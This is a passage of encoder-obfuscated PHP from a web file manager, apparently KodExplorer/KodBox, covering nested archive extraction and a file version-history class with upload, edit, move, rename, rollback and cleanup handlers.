isset($„­äêí³[$à¢ÆËÌ†[1247]]) ? $„­äêí³[$à¢ÆËÌ†[1247]] : !1; $Èé´ÒœÏ = isset($„­äêí³[$à¢ÆËÌ†[1243]]) ? @json_decode($„­äêí³[$à¢ÆËÌ†[1243]], !0) : -1; $ èµ‡ = self::unzipPart($„­äêí³[$à¢ÆËÌ†[84]], $Èé´ÒœÏ); if (!$ èµ‡ || !IO::exist($ èµ‡[$à¢ÆËÌ†[214]])) { show_json(LNG($à¢ÆËÌ†[105]), !1); } $÷åÅ‹£ = $ èµ‡[$à¢ÆËÌ†[1242]][count($ èµ‡[$à¢ÆËÌ†[1242]]) - 1]; $ã¾àæùì = in_array(IO::ext($ èµ‡[$à¢ÆËÌ†[214]]), array($à¢ÆËÌ†[366], $à¢ÆËÌ†[1248], $à¢ÆËÌ†[1249], $à¢ÆËÌ†[1250], $à¢ÆËÌ†[1251], $à¢ÆËÌ†[1252])); if (!$õöÉŒ¥„ && ($÷åÅ‹£[$à¢ÆËÌ†[1243]] == -1 || $ã¾àæùì)) { $İ”†¶”û = $ èµ‡[$à¢ÆËÌ†[1244]] . get_path_this($ èµ‡[$à¢ÆËÌ†[214]]) . $à¢ÆËÌ†[1253]; if (!IO::exist($İ”†¶”û)) { $—ğé¢Ñğ = $÷åÅ‹£[$à¢ÆËÌ†[1243]] == -1 ? get_path_ext(IO::pathThis($„­äêí³[$à¢ÆËÌ†[84]])) : get_path_ext($ èµ‡[$à¢ÆËÌ†[214]]); $ˆ””Îç = KodArchive::listContent(self::iconvSystem($ èµ‡[$à¢ÆËÌ†[214]]), !0, $—ğé¢Ñğ); self::unzipErrorCheck($ˆ””Îç, array($à¢ÆËÌ†[1254], $„­äêí³, $ èµ‡)); @file_put_contents($İ”†¶”û, json_encode($ˆ””Îç[$à¢ÆËÌ†[1255]])); } return @json_decode(IO::getContent($İ”†¶”û), !0); } IO::fileOut($ èµ‡[$à¢ÆËÌ†[214]], $õöÉŒ¥„, get_path_this($÷åÅ‹£[$à¢ÆËÌ†[32]])); die; } private static function zipFileList($¹¥†£¿, $ó›…ÊÖ = false) { $»¨Ø¬·ı =& $_SERVER[Ö†ØøÖ±]; $Š›ôşæò = array(); foreach ($¹¥†£¿ as $ÀİÉ¥ó) { $Â³ŠÓü = $ÀİÉ¥ó[$»¨Ø¬·ı[84]]; if ($ó›…ÊÖ) { $Â³ŠÓü = self::copy($ÀİÉ¥ó[$»¨Ø¬·ı[84]], $ó›…ÊÖ, $»¨Ø¬·ı[871]); } else { $á¯Š·½² = self::init($ÀİÉ¥ó[$»¨Ø¬·ı[84]]); if ($á¯Š·½²->getType() == $»¨Ø¬·ı[106]) { $Â³ŠÓü = $á¯Š·½²->path; } } if ($Â³ŠÓü && self::local()->exist($Â³ŠÓü)) { $Š›ôşæò[$ÀİÉ¥ó[$»¨Ø¬·ı[84]]] = $Â³ŠÓü; } } if (!empty($Š›ôşæò)) { return array_values($Š›ôşæò); } show_json(LNG($»¨Ø¬·ı[1218]), !1); } private static function localFilePath($ö¸‰Ï£Ş) { $á™æµÎ¿ =& $_SERVER[Ö†ØøÖ±]; $õü€Îšú = KodIO::parse($ö¸‰Ï£Ş); if ($õü€Îšú[$á™æµÎ¿[33]] == KodIO::KOD_SOURCE) { $ÜŸÊÖå = Model($á™æµÎ¿[878])->fileInfoGet(KodIO::sourceID($ö¸‰Ï£Ş)); if (!$ÜŸÊÖå[$á™æµÎ¿[84]]) { show_json($á™æµÎ¿[1256], !1); } $ö¸‰Ï£Ş = $ÜŸÊÖå[$á™æµÎ¿[84]]; } $û£¯Œ£ = self::init($ö¸‰Ï£Ş); if ($û£¯Œ£->pathParse[$á™æµÎ¿[1204]]) { $ö¸‰Ï£Ş = $û£¯Œ£->pathParse[$á™æµÎ¿[1204]]; $û£¯Œ£ = self::init($ö¸‰Ï£Ş); } $æ¢ËÒ—ê = $û£¯Œ£->getType(); if ($æ¢ËÒ—ê == $á™æµÎ¿[106] || $æ¢ËÒ—ê == $á™æµÎ¿[1257]) { if (!$û£¯Œ£->exist($û£¯Œ£->path)) { show_json(LNG($á™æµÎ¿[105]), !1); } return $û£¯Œ£->path; } return !1; } public static function unzipPart($ûÓ¡¶¿», $İù²™™â = -1) { $öÀ‰ÖÔ¨ =& $_SERVER[Ö†ØøÖ±]; $ÓÇÕçÒÙ = IO::pathThis($ûÓ¡¶¿»); if (!$İù²™™â || $İù²™™â == -1) { $Ù•¼³û = array(array($öÀ‰ÖÔ¨[32] => $ÓÇÕçÒÙ, $öÀ‰ÖÔ¨[1243] => -1)); $Ù•¼³û[0][$öÀ‰ÖÔ¨[1258]] = $Ù•¼³û[0][$öÀ‰ÖÔ¨[32]]; } else { if (is_array($İù²™™â)) { $Ù•¼³û = $İù²™™â; $èº¸‰ÊÛ = count($Ù•¼³û) - 1; for ($İ«ÌËè = 0; $İ«ÌËè <= $èº¸‰ÊÛ; $İ«ÌËè++) { $µòó»™› = $Ù•¼³û[$İ«ÌËè]; $ãÙî´òŸ = get_path_this($µòó»™›[$öÀ‰ÖÔ¨[32]]) . (checkExtSafe($µòó»™›[$öÀ‰ÖÔ¨[32]]) ? $öÀ‰ÖÔ¨[12] : $öÀ‰ÖÔ¨[1259]); $Ù•¼³û[$İ«ÌËè][$öÀ‰ÖÔ¨[1258]] = $öÀ‰ÖÔ¨[1260] . intval($µòó»™›[$öÀ‰ÖÔ¨[1243]]) . $öÀ‰ÖÔ¨[438] . $ãÙî´òŸ; if ($İ«ÌËè == 0) { continue; } $Ù•¼³û[$İ«ÌËè][$öÀ‰ÖÔ¨[1258]] = $Ù•¼³û[$İ«ÌËè - 1][$öÀ‰ÖÔ¨[1258]] . $öÀ‰ÖÔ¨[1261] . $Ù•¼³û[$İ«ÌËè][$öÀ‰ÖÔ¨[1258]]; } } } if (!is_array($Ù•¼³û) || count($Ù•¼³û) == 0) { return !1; } $ÔøÜŠ = $Ù•¼³û[count($Ù•¼³û) - 1]; if (!IO::exist($ûÓ¡¶¿»)) { return !1; } $ò§Ú­ëœ = TEMP_FILES . $öÀ‰ÖÔ¨[1262] . kodIO::hashPathSafe($ûÓ¡¶¿») . $öÀ‰ÖÔ¨[8]; $û¼…·Å€ = $ò§Ú­ëœ . $ÔøÜŠ[$öÀ‰ÖÔ¨[1258]]; mk_dir($ò§Ú­ëœ); file_put_contents(TEMP_FILES . $öÀ‰ÖÔ¨[1237], $öÀ‰ÖÔ¨[12]); if (IO::exist($û¼…·Å€)) { return array($öÀ‰ÖÔ¨[214] => $û¼…·Å€, $öÀ‰ÖÔ¨[1242] => $Ù•¼³û, $öÀ‰ÖÔ¨[1244] => $ò§Ú­ëœ); } $Üô­‘é = self::localFilePath($ûÓ¡¶¿»); if (!$Üô­‘é) { $Üô­‘é = $ò§Ú­ëœ . $öÀ‰ÖÔ¨[1263]; if (!IO::exist($Üô­‘é)) { self::copy($ûÓ¡¶¿», $ò§Ú­ëœ, !1, get_path_this($Üô­‘é)); } } if (!$Üô­‘é || !IO::exist($Üô­‘é)) { return !1; } if ($ÔøÜŠ[$öÀ‰ÖÔ¨[1243]] == -1) { return array($öÀ‰ÖÔ¨[214] => $Üô­‘é, $öÀ‰ÖÔ¨[1242] => $Ù•¼³û, $öÀ‰ÖÔ¨[1244] => $ò§Ú­ëœ); } $Ÿ·åşï¨ = $Üô­‘é; foreach ($Ù•¼³û as $İ«ÌËè => $µòó»™›) { if (!$µòó»™› || $µòó»™›[$öÀ‰ÖÔ¨[1243]] == $öÀ‰ÖÔ¨[1241]) { break; } if (substr($µòó»™›[$öÀ‰ÖÔ¨[32]], -1, 1) == $öÀ‰ÖÔ¨[8]) { break; } $ôüÚúÕ = in_array(get_path_ext($µòó»™›[$öÀ‰ÖÔ¨[1258]]), array($öÀ‰ÖÔ¨[366], $öÀ‰ÖÔ¨[1248], $öÀ‰ÖÔ¨[1249], $öÀ‰ÖÔ¨[1250], $öÀ‰ÖÔ¨[1251], $öÀ‰ÖÔ¨[1252])); $‹§ÆËÚ = $İ«ÌËè == count($Ù•¼³û) - 1 && $ôüÚúÕ; $è–“±àÏ = $ò§Ú­ëœ . $µòó»™›[$öÀ‰ÖÔ¨[1258]]; $¿¼«Õ¦‚ = $ò§Ú­ëœ . get_path_this($µòó»™›[$öÀ‰ÖÔ¨[32]]); if (IO::exist($è–“±àÏ)) { $Ÿ·åşï¨ = $è–“±àÏ; continue; } $Ñ£”¿ì = $İ«ÌËè == 0 ? get_path_ext($ÓÇÕçÒÙ) : get_path_ext($Ÿ·åşï¨); $ëîò– = KodArchive::extract(self::iconvSystem($Ÿ·åşï¨), $ò§Ú­ëœ, $µòó»™›[$öÀ‰ÖÔ¨[1243]], $÷áô¶äÅ, $Ñ£”¿ì); self::unzipErrorCheck($ëîò–, array($öÀ‰ÖÔ¨[1264], $ûÓ¡¶¿», $Ù•¼³û, $µòó»™›, $è–“±àÏ)); if (IO::exist($¿¼«Õ¦‚)) { IO::rename($¿¼«Õ¦‚, get_path_this($è–“±àÏ)); } $Ÿ·åşï¨ = $è–“±àÏ; } $û¼…·Å€ = $Ÿ·åşï¨; return array($öÀ‰ÖÔ¨[214] => $Ÿ·åşï¨, $öÀ‰ÖÔ¨[1242] => $Ù•¼³û, $öÀ‰ÖÔ¨[1244] => $ò§Ú­ëœ); } private static function unzipErrorCheck($ßÙàÌ, $ˆ–ŠÎúŸ = false) { $ä×íê¯ü =& $_SERVER[Ö†ØøÖ±]; if ($ßÙàÌ[$ä×íê¯ü[1265]]) { return !0; } write_log(array($ä×íê¯ü[1266], $ßÙàÌ, $ˆ–ŠÎúŸ), $ä×íê¯ü[1267]); show_json($ä×íê¯ü[1268] . json_encode($ßÙàÌ[$ä×íê¯ü[1255]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $½¤Ú°÷í =& $_SERVER[Ö†ØøÖ±]; $ë£Ş Éµ = $GLOBALS[$½¤Ú°÷í[6]][$½¤Ú°÷í[89]]; if ($ë£Ş Éµ[$½¤Ú°÷í[1269]] != 1) { return; } if ($ë£Ş Éµ[$½¤Ú°÷í[1270]] <= 0) { return; } if (isset($_REQUEST[$½¤Ú°÷í[1271]]) && $_REQUEST[$½¤Ú°÷í[1271]] == $½¤Ú°÷í[88]) { return; } Hook::bind($½¤Ú°÷í[1272], $½¤Ú°÷í[1273]); Hook::bind($½¤Ú°÷í[1274], $½¤Ú°÷í[1275]); Hook::bind($½¤Ú°÷í[1276], $½¤Ú°÷í[1277]); Hook::bind($½¤Ú°÷í[1278], $½¤Ú°÷í[1279]); Hook::bind($½¤Ú°÷í[1280], $½¤Ú°÷í[1281]); Hook::bind($½¤Ú°÷í[1282], $½¤Ú°÷í[1283]); } public static function eventBeforeUpload($˜ ÇèÈ) { if ($˜ ÇèÈ[3] && $˜ ÇèÈ[3] != REPEAT_REPLACE) { return; } $²”¾£ç– = self::parsePath($˜ ÇèÈ[0]); if (!$²”¾£ç–) { return; } self::add($²”¾£ç–); } public static function eventBeforeEdit($ÔÙˆê»¸) { $øµñËµù = self::parsePath($ÔÙˆê»¸[0]); if (!$øµñËµù) { return; } self::add($øµñËµù); } public static function eventBeforeCopyFile($·¯ŠÍÔ¨, $½•âµÅô, $ó­…èé˜, $¦¡ş„Åİ, $¢”¨üÒÍ, $öÕÕçà¦) { $”´Éô¦É =& $_SERVER[Ö†ØøÖ±]; if (isset($ó­…èé˜->_data[$”´Éô¦É[1208]]) && $ó­…èé˜->_data[$”´Éô¦É[1208]]) { return; } $‡¡Ë†‡ = $ó­…èé˜->getPathOuter($¦¡ş„Åİ); $ƒáÈö‡˜ = self::parsePath($‡¡Ë†‡); if (!$ƒáÈö‡˜) { return; } self::add($ƒáÈö‡˜); } public static function eventBeforeRename($±íö —ı) { $×šÏŸ¶§ =& $_SERVER[Ö†ØøÖ±]; $ÆËŞØğ = self::parsePath($±íö —ı[0]); if (!$ÆËŞØğ) { return; } $Óş˜¦› = self::checkInHistory($ÆËŞØğ); if (!$Óş˜¦›) { return; } if ($Óş˜¦›[$×šÏŸ¶§[33]] == $×šÏŸ¶§[214]) { $™‹¢Û½Ó = self::listData($ÆËŞØğ); if ($™‹¢Û½Ó && $™‹¢Û½Ó[$×šÏŸ¶§[422]]) { self::moveHistory($ÆËŞØğ, $±íö —ı[1]); } } else { IO::rename($Óş˜¦›[$×šÏŸ¶§[84]], $±íö —ı[1]); } } public static function eventBeforeMove($ëÙªì§¸) { $¢áÒ´¬º =& $_SERVER[Ö†ØøÖ±]; $ûß³«»à = self::parsePath($ëÙªì§¸[0]); if (!$ûß³«»à) { return; } $×¿¥ŒÜ = self::parsePath($ëÙªì§¸[1]); if (!$×¿¥ŒÜ) { return; } $Ù…ŞÚæœ = $ëÙªì§¸[3]; $û½Ûµî = self::checkInHistory($ûß³«»à); if (!$û½Ûµî) { return; } $²¿‚‚“  = self::pathHistory($×¿¥ŒÜ); if ($û½Ûµî[$¢áÒ´¬º[33]] == $¢áÒ´¬º[214]) { $äçÒœ­© = self::listData($ûß³«»à); $ô›öŸĞ° = rtrim($×¿¥ŒÜ, $¢áÒ´¬º[8]) . $¢áÒ´¬º[8] . ($Ù…ŞÚæœ ? $Ù…ŞÚæœ : get_path_this($ûß³«»à)); $ÚÑƒŒçª = self::listData($ô›öŸĞ°); if ($äçÒœ­© && $äçÒœ­©[$¢áÒ´¬º[422]] && $ÚÑƒŒçª && $ÚÑƒŒçª[$¢áÒ´¬º[422]]) { return self::clear($ûß³«»à); } if ($äçÒœ­© && $äçÒœ­©[$¢áÒ´¬º[422]]) { self::moveHistory($ûß³«»à, $Ù…ŞÚæœ, $²¿‚‚“ ); } } else { IO::move($û½Ûµî[$¢áÒ´¬º[84]], $²¿‚‚“ , !1, $Ù…ŞÚæœ); self::clearEmptyFolder(IO::pathFather($û½Ûµî[$¢áÒ´¬º[84]])); } } public static function eventAfterRemove($ºå¿¼·, $ôàÔú¿²) { $ŞãÍ½±› =& $_SERVER[Ö†ØøÖ±]; if (!$ôàÔú¿²) { return; } $Íë»¬ÙÍ = self::parsePath($ºå¿¼·[0]); if (!$Íë»¬ÙÍ) { return; } $ôÉæá² = self::checkInHistory($Íë»¬ÙÍ); if (!$ôÉæá²) { return; } if ($ôÉæá²[$ŞãÍ½±›[33]] == $ŞãÍ½±›[214]) { $è¼ôó£¼ = self::listData($Íë»¬ÙÍ, !1); if ($è¼ôó£¼ && $è¼ôó£¼[$ŞãÍ½±›[422]]) { self::clear($Íë»¬ÙÍ, !1); } } else { IO::remove($ôÉæá²[$ŞãÍ½±›[84]]); self::clearEmptyFolder(IO::pathFather($ôÉæá²[$ŞãÍ½±›[84]])); } } private static function checkInHistory($¡Å‡ÉĞ) { $¬ºÄ¢Ğí = self::pathHistory($¡Å‡ÉĞ); if (!IO::exist($¬ºÄ¢Ğí)) { $¬ºÄ¢Ğí .= $_SERVER[Ö†ØøÖ±][1284]; } return IO::exist($¬ºÄ¢Ğí) ? IO::info($¬ºÄ¢Ğí) : !1; } private static function parsePath($¨Å‹…¦¯) { $š“ÊÈÉ· =& $_SERVER[Ö†ØøÖ±]; if (!$¨Å‹…¦¯) { return !1; } if ($GLOBALS[$š“ÊÈÉ·[1285]]) { return; } $çˆÅ£Ë  = KodIO::parse($¨Å‹…¦¯); $äà•§üğ = $çˆÅ£Ë [$š“ÊÈÉ·[33]]; $…šÑşÍ = !$äà•§üğ || $äà•§üğ == KodIO::KOD_IO || $äà•§üğ == KodIO::KOD_SHARE_ITEM; if (!$…šÑşÍ || !$çˆÅ£Ë [$š“ÊÈÉ·[1286]]) { return !1; } if (substr($¨Å‹…¦¯, 0, strlen(DATA_PATH . $š“ÊÈÉ·[1287])) == DATA_PATH . $š“ÊÈÉ·[1287]) { return !1; } if ($äà•§üğ == KodIO::KOD_SHARE_ITEM) { $³îúüèã = IO::init($¨Å‹…¦¯); if ($³îúüèã->pathParse[$š“ÊÈÉ·[1204]]) { return self::parsePath($³îúüèã->pathParse[$š“ÊÈÉ·[1204]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Èì®²±„ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $š“ÊÈÉ·[1288]); foreach ($Èì®²±„ as $´åûÇµ©) { if (!$äà•§üğ && substr($¨Å‹…¦¯, 0, strlen($´åûÇµ©)) == $´åûÇµ©) { return !1; } } self::log($GLOBALS[$š“ÊÈÉ·[1199]] . $š“ÊÈÉ·[1289] . $¨Å‹…¦¯); return $¨Å‹…¦¯; } private static function pathHistory($ĞÑ§Æõ) { $³‰İ¬ÕË =& $_SERVER[Ö†ØøÖ±]; $Ö³ôìÆ« = self::$_historyBase . ltrim(KodIO::clear($ĞÑ§Æõ), $³‰İ¬ÕË[8]); $Ö³ôìÆ« = str_replace(array($³‰İ¬ÕË[1290]), array($³‰İ¬ÕË[1291]), $Ö³ôìÆ«); return $Ö³ôìÆ«; } public static function log($Ú¾†÷×ö) { } public static function historyCount($“°ëÅš¹) { $æ£á–ş£ =& $_SERVER[Ö†ØøÖ±]; $Úâ¨ü = array(); $Ğ«åÉşÄ = array(); foreach ($“°ëÅš¹ as $£”–â±Ü) { $Í¦Î = get_path_father($£”–â±Ü); if (!$Ğ«åÉşÄ[$Í¦Î]) { $Ğ«åÉşÄ[$Í¦Î] = array(); } $Ğ«åÉşÄ[$Í¦Î][] = get_path_this($£”–â±Ü); } foreach ($Ğ«åÉşÄ as $Í¦Î => $ŠíƒüÀÛ) { $µ›ç¾şÌ = self::parsePath($Í¦Î); if (!$µ›ç¾şÌ) { continue; } foreach ($ŠíƒüÀÛ as $ØßÏü¼Õ) { $¹ßãªş = self::listData(rtrim($µ›ç¾şÌ, $æ£á–ş£[8]) . $æ£á–ş£[8] . $ØßÏü¼Õ, !1); if ($¹ßãªş && $¹ßãªş[$æ£á–ş£[422]]) { $Úâ¨ü[rtrim($Í¦Î, $æ£á–ş£[8]) . $æ£á–ş£[8] . $ØßÏü¼Õ] = count($¹ßãªş[$æ£á–ş£[422]]); } } } return $Úâ¨ü; } public static function add($»Æ³ğã) { $õº¢Šª =& $_SERVER[Ö†ØøÖ±]; $­¬¡ØÃ = self::listData($»Æ³ğã); if (!$­¬¡ØÃ) { return; } $¥…èíŞ† = Model($õº¢Šª[823])->get($õº¢Šª[1292]); $İ¶¥›½Õ = $GLOBALS[$õº¢Šª[6]][$õº¢Šª[89]][$õº¢Šª[1270]]; $ ÕÙ¦®Ù = $¥…èíŞ† == $õº¢Šª[1293] ? min(5, $İ¶¥›½Õ) : $İ¶¥›½Õ; if ($İ¶¥›½Õ <= 0) { return; } $±‘Ó–ñ = IO::info($»Æ³ğã); $Ï¿üÏÚ” = $­¬¡ØÃ[$õº¢Šª[422]]; if ($±‘Ó–ñ[$õº¢Šª[76]] == 0) { return; } if ($±‘Ó–ñ[$õº¢Šª[76]] >= 1024 * 1024 * 500) { return !1; } $Ô•ŠÕš• = IO::hashSimple($»Æ³ğã); if ($Ï¿üÏÚ” && $Ï¿üÏÚ”[0][$õº¢Šª[649]] == $Ô•ŠÕš•) { return !0; } if (array_key_exists($õº¢Šª[217], $±‘Ó–ñ) && !$±‘Ó–ñ[$õº¢Šª[217]]) { return !1; } $¢²—Õ¬Õ = short_id(time()); $ı¢È×¼· = array($õº¢Šª[451] => $¢²—Õ¬Õ, $õº¢Šª[649] => $Ô•ŠÕš•, $õº¢Šª[32] => $±‘Ó–ñ[$õº¢Šª[32]] . $õº¢Šª[10] . date($õº¢Šª[1294]) . rand_string(1), $õº¢Šª[76] => $±‘Ó–ñ[$õº¢Šª[76]], $õº¢Šª[504] => USER_ID, $õº¢Šª[215] => time(), $õº¢Šª[1295] => $õº¢Šª[12]); IO::mkdir($­¬¡ØÃ[$õº¢Šª[1296]]); $½¨õí‹½ = IO::copy($»Æ³ğã, $­¬¡ØÃ[$õº¢Šª[1296]], !1, $ı¢È×¼·[$õº¢Šª[32]]); if (!$½¨õí‹½) { self::clearEmptyFolder($­¬¡ØÃ[$õº¢Šª[1296]]); return !1; } array_unshift($Ï¿üÏÚ”, $ı¢È×¼·); if (count($Ï¿üÏÚ”) > $ ÕÙ¦®Ù) { $¿„Ìà­Á = array_slice($Ï¿üÏÚ”, $ ÕÙ¦®Ù); foreach ($¿„Ìà­Á as $¡„ÏÄ”²) { IO::remove($­¬¡ØÃ[$õº¢Šª[1296]] . $¡„ÏÄ”²[$õº¢Šª[32]]); } $Ï¿üÏÚ” = array_slice($Ï¿üÏÚ”, 0, $ ÕÙ¦®Ù); } return self::saveData($­¬¡ØÃ[$õº¢Šª[1297]], $Ï¿üÏÚ”); } public static function remove($İÛŸ‰Æ¯, $ˆ²ÁËÖ) { $ûï¤ûœà =& $_SERVER[Ö†ØøÖ±]; $ª“»ş¨ = self::listData($İÛŸ‰Æ¯); $ÉâµƒÔ = array(); if (!$ª“»ş¨) { return !1; } foreach ($ª“»ş¨[$ûï¤ûœà[422]] as $Äˆ°ìÜÈ) { if ($Äˆ°ìÜÈ[$ûï¤ûœà[451]] == $ˆ²ÁËÖ) { IO::remove($ª“»ş¨[$ûï¤ûœà[1296]] . $Äˆ°ìÜÈ[$ûï¤ûœà[32]]); continue; } $ÉâµƒÔ[] = $Äˆ°ìÜÈ; } return self::saveData($ª“»ş¨[$ûï¤ûœà[1297]], $ÉâµƒÔ); } public static function clear($¾ŞŠ”Õì, $…ñ€Æ¹ñ = true) { $Éë¢¿ã  =& $_SERVER[Ö†ØøÖ±]; $‹‹Ìƒ¡ = self::listData($¾ŞŠ”Õì, $…ñ€Æ¹ñ); if (!$‹‹Ìƒ¡) { return !1; } foreach ($‹‹Ìƒ¡[$Éë¢¿ã [422]] as $Šü§Â˜Ø) { IO::remove($‹‹Ìƒ¡[$Éë¢¿ã [1296]] . $Šü§Â˜Ø[$Éë¢¿ã [32]]); } return self::saveData($‹‹Ìƒ¡[$Éë¢¿ã [1297]], array()); } public static function moveHistory($Á€Æä†µ, $Æ„Õ¹Õö = '', $˜ä˜”ø = '') { $è¼Á¦ş =& $_SERVER[Ö†ØøÖ±]; $ˆõ°ü = self::listData($Á€Æä†µ, !1); if (!$ˆõ°ü || !$ˆõ°ü[$è¼Á¦ş[422]]) { return !1; } $òÁñÜí„ = $è¼Á¦ş[1284]; $Æ„Õ¹Õö = $Æ„Õ¹Õö ? $Æ„Õ¹Õö : get_path_this($Á€Æä†µ); $˜ä˜”ø = $˜ä˜”ø ? $˜ä˜”ø : $ˆõ°ü[$è¼Á¦ş[1296]]; $ÜŠ«÷®Ë = substr(get_path_this($ˆõ°ü[$è¼Á¦ş[1297]]), 0, -strlen($òÁñÜí„)); foreach ($ˆõ°ü[$è¼Á¦ş[422]] as $ áô©»³ => $²úåÇ©Ø) { $¾ç¡ŞË = $Æ„Õ¹Õö . substr($²úåÇ©Ø[$è¼Á¦ş[32]], strlen($ÜŠ«÷®Ë)); $íÂÎ¤ = IO::move($ˆõ°ü[$è¼Á¦ş[1296]] . $²úåÇ©Ø[$è¼Á¦ş[32]], $˜ä˜”ø, !1, $¾ç¡ŞË); if ($íÂÎ¤) { $ˆõ°ü[$è¼Á¦ş[422]][$ áô©»³][$è¼Á¦ş[32]] = $¾ç¡ŞË; } } $ˆõ°ü[$è¼Á¦ş[1297]] = IO::move($ˆõ°ü[$è¼Á¦ş[1297]], $˜ä˜”ø, !1, $Æ„Õ¹Õö . $òÁñÜí„); self::saveData($ˆõ°ü[$è¼Á¦ş[1297]], $ˆõ°ü[$è¼Á¦ş[422]]); self::clearEmptyFolder($ˆõ°ü[$è¼Á¦ş[1296]]); } public static function rollback($÷ùŠî‘ù, $ô£ğóœ‚) { $¯Ñ€ˆÃ€ =& $_SERVER[Ö†ØøÖ±]; $‚©àŸƒœ = self::listData($÷ùŠî‘ù); if (!$‚©àŸƒœ) { return; } $Ûá‚„×ê = IO::info($÷ùŠî‘ù); foreach ($‚©àŸƒœ[$¯Ñ€ˆÃ€[422]] as $Ç¹§üî½ => $”Å–Ì†¥) { if ($”Å–Ì†¥[$¯Ñ€ˆÃ€[451]] == $ô£ğóœ‚) { self::add($÷ùŠî‘ù); $Â³´ñÑƒ = $‚©àŸƒœ[$¯Ñ€ˆÃ€[1296]] . $”Å–Ì†¥[$¯Ñ€ˆÃ€[32]]; $÷ã£ÄĞ = IO::copy($Â³´ñÑƒ, IO::pathFather($÷ùŠî‘ù), REPEAT_REPLACE, $Ûá‚„×ê[$¯Ñ€ˆÃ€[32]]); if ($÷ã£ÄĞ) { self::remove($÷ùŠî‘ù, $ô£ğóœ‚); } return $÷ã£ÄĞ; } } return !1; } public static function setDetail($—ãÒ“ıœ, $ÅÓñ¤òÕ, $’®ò æŒ) { $óÈö‡Ï€ =& $_SERVER[Ö†ØøÖ±]; $ „€çúƒ = self::listData($—ãÒ“ıœ); if (!$ „€çúƒ) { return; } foreach ($ „€çúƒ[$óÈö‡Ï€[422]] as $Á¦üŒË” => $¥Ò»•©‘) { if ($¥Ò»•©‘[$óÈö‡Ï€[451]] == $ÅÓñ¤òÕ) { $ „€çúƒ[$óÈö‡Ï€[422]][$Á¦üŒË”][$óÈö‡Ï€[1295]] = $’®ò æŒ; self::saveData($ „€çúƒ[$óÈö‡Ï€[1297]], $ „€çúƒ[$óÈö‡Ï€[422]]); return !0; } } return !1; } public static function fileInfo($ä·Ã¨•³, $¹ò£ó×) { $ÜˆÖ®…Æ =& $_SERVER[Ö†ØøÖ±]; $ûå¡Êô = self::listData($ä·Ã¨•³); if (!$ûå¡Êô) { show_json(LNG($ÜˆÖ®…Æ[105]), !1); } $ù‡îÆ²â = $ÜˆÖ®…Æ[12]; foreach ($ûå¡Êô[$ÜˆÖ®…Æ[422]] as $öşŸµ”µ => $ÏŞÂ§½Ä) { if ($ÏŞÂ§½Ä[$ÜˆÖ®…Æ[451]] != $¹ò£ó×) { continue; } $ù‡îÆ²â = $ûå¡Êô[$ÜˆÖ®…Æ[1296]] . $ÏŞÂ§½Ä[$ÜˆÖ®…Æ[32]]; break; } if (!$ù‡îÆ²â) { show_json(LNG($ÜˆÖ®…Æ[105]), !1); } return IO::info($ù‡îÆ²â); } public static function fileOut($ÒÕ‹›«, $šÇ€à•ğ, $Ç¯ñˆä = false) { $ Î§°úà =& $_SERVER[Ö†ØøÖ±]; $İæşÏäß = self::fileInfo($ÒÕ‹›«, $šÇ€à•ğ); $»±ØªÌë =& $GLOBALS[$ Î§°úà[7]]; $Ç¯ñˆä = isset($»±ØªÌë[$ Î§°úà[1247]]) && $»±ØªÌë[$ Î§°úà[1247]] == 1; if (isset($»±ØªÌë[$ Î§°úà[33]]) && $»±ØªÌë[$ Î§°úà[33]] == $ Î§°úà[1298]) { return IO::fileOutImage($İæşÏäß[$ Î§°úà[84]], $»±ØªÌë[$ Î§°úà[1299]]); } IO::fileOut($İæşÏäß[$ Î§°úà[84]], $Ç¯ñˆä, get_path_this($ÒÕ‹›«)); } public static function listData($ìÆ°û²¯, $‘¤Şú† = true) { $ âÖ•Ê =& $_SERVER[Ö†ØøÖ±]; if ($‘¤Şú† && !IO::exist($ìÆ°û²¯)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ìÆ°û²¯, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¾·öü­¹ = self::pathHistory($ìÆ°û²¯); $Å”Î»¿Ó = array($ âÖ•Ê[1297] => $¾·öü­¹ . $ âÖ•Ê[1284], $ âÖ•Ê[1296] => rtrim(get_path_father($¾·öü­¹), $ âÖ•Ê[8]) . $ âÖ•Ê[8], $ âÖ•Ê[422] => array()); $ªÛ·çÈÃ = IO::getContent($Å”Î»¿Ó[$ âÖ•Ê[1297]]); if ($ªÛ·çÈÃ) { $ÌÅî¾ÎÚ = json_decode($ªÛ·çÈÃ, !0); if (is_array($ÌÅî¾ÎÚ)) { $Å”Î»¿Ó[$ âÖ•Ê[422]] = $ÌÅî¾ÎÚ; } } return $Å”Î»¿Ó; } private static function saveData($ä„Ö•¬, $ÏéúÖŒÑ) { $ëñõ½û‰ =& $_SERVER[Ö†ØøÖ±]; self::log($ëñõ½û‰[1300] . $ä„Ö•¬ . $ëñõ½û‰[71] . count($ÏéúÖŒÑ), $ëñõ½û‰[804]); if ($ÏéúÖŒÑ) { return IO::setContent($ä„Ö•¬, json_encode($ÏéúÖŒÑ)); } $­äßøö = IO::pathFather($ä„Ö•¬); IO::remove($ä„Ö•¬); self::clearEmptyFolder($­äßøö); return !0; } public static function clearEmptyFolder($™ñ¹Í™û) { $¶‚—ËÔÑ =& $_SERVER[Ö†ØøÖ±]; if (trim($™ñ¹Í™û, $¶‚—ËÔÑ[8]) == trim(self::$_historyBase, $¶‚—ËÔÑ[8])) { return; } $å™ßâ„ = IO::pathFather($™ñ¹Í™û); $œ«üõÜ… = IO::has($™ñ¹Í™û, !0); if ($œ«üõÜ…[$¶‚—ËÔÑ[223]] > 0 || $œ«üõÜ…[$¶‚—ËÔÑ[224]] > 0) { return; } IO::remove($™ñ¹Í™û); self::clearEmptyFolder($å™ßâ„); } private static function getBasePath() { $û¬ŸÃ„İ =& $_SERVER[Ö†ØøÖ±]; $Îèñøì = Model($û¬ŸÃ„İ[1301])->get($û¬ŸÃ„İ[1302]); if ($Îèñøì) { if (!IO::exist($Îèñøì)) { IO::mkdir($Îèñøì); } if (get_path_this($Îèñøì) == $û¬ŸÃ„İ[1287]) { $åˆÓäĞœ = $û¬ŸÃ„İ[1303] . rand_string(8); @rename($Îèñøì, get_path_father($Îèñøì) . $û¬ŸÃ„İ[8] . $åˆÓäĞœ); $Îèñøì = DATA_PATH . $åˆÓäĞœ . $û¬ŸÃ„İ[8]; 